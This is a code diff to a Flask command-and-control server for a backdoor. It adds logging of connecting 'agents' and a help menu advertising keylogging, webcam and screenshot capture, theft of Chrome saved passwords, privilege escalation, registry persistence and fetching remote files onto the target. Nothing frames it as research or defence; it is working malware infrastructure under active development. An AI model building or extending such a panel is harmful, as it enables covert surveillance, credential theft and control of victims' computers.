@@ -5,6 +5,8 @@ from bot import Bot
 from title import title
 import threading
 from werkzeug.utils import secure_filename
+from datetime import datetime
+import logging
 
 app = Flask(__name__)
 
@@ -16,10 +18,51 @@ t1 = None
 # Add these constants after the existing ones
 UPLOAD_FOLDER = 'uploads'
 ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'exe'}
+HELP_TEXT = '''
+Available Commands:
+------------------
+Basic Commands:
+  help                  --> Show this help message
+  quit                  --> Quit Session With The Target
+  clear                 --> Clear The Screen
+  cd <directory>        --> Changes Directory On Target System
+
+File Operations:
+  upload <file>         --> Upload File To The Target Machine From uploads/ Directory
+  download <file>       --> Download File From Target Machine
+  get <url>            --> Download File From Specified URL to Target ./
+
+Surveillance:
+  screenshot           --> Takes screenshot and sends to server ./images/screenshots/
+  webcam              --> Takes image with webcam and sends to ./images/webcam/
+  keylog_start        --> Start The Keylogger
+  keylog_dump         --> Print Keystrokes From taskmanager.txt
+  keylog_stop         --> Stop And Self Destruct Keylogger File
+  chrome_pass         --> Retrieves Browser Saved Passwords
+
+System Commands:
+  start <program>      --> Spawn Program Using backdoor (e.g. 'start notepad')
+  check               --> Check If Has Administrator Privileges
+  privilege           --> Attempt to escalate privileges
+  remove_backdoor     --> Removes backdoor from target
+
+Windows Specific:
+  persistence <RegName> <filename>  --> Create Persistence In Registry
+'''
 
 # Add this configuration after creating the Flask app
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+
+# Set up logging after Flask app creation
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('server.log'),
+        logging.StreamHandler()
+    ]
+)
 
 def initialise_socket():
     import socket
@@ -30,6 +73,7 @@ def initialise_socket():
     return sock
 
 def accept_connections():
+    logging.info("C2 Server started and listening for connections...")
     while True:
         if not start_flag:
             break
@@ -38,11 +82,14 @@ def accept_connections():
             target, ip = sock.accept()
             try:
                 bot = Bot(target, ip)
+                logging.info(f"New agent connected - IP: {ip[0]}:{ip[1]} | Session ID: {bot.id}")
             except Exception as e:
-                print(e)
+                logging.error(f"Error creating bot instance: {e}")
             print(f'{ip} has connected!')
-        except:
-            pass
+        except socket.timeout:
+            continue
+        except Exception as e:
+            logging.error(f"Error accepting connection: {e}")
 
 @app.route('/')
 def index():
@@ -84,13 +131,20 @@ def send_command():
     session_id = int(data.get('session_id'))
     command = data.get('command')
     
+    # Handle help command locally
+    if command == 'help':
+        return jsonify({'result': HELP_TEXT})
+    
     if session_id not in Bot.botList:
+        logging.warning(f"Invalid session ID attempted: {session_id}")
         return jsonify({'error': 'Invalid session ID'}), 400
         
     bot = Bot.botList[session_id]
+    logging.info(f"Command sent to Session {session_id} ({bot.ip}): {command}")
     
     if command == 'quit':
         result = bot.kill()
+        logging.info(f"Session {session_id} ({bot.ip}) terminated")
         return jsonify({'message': result})
     
     # Handle file upload commands
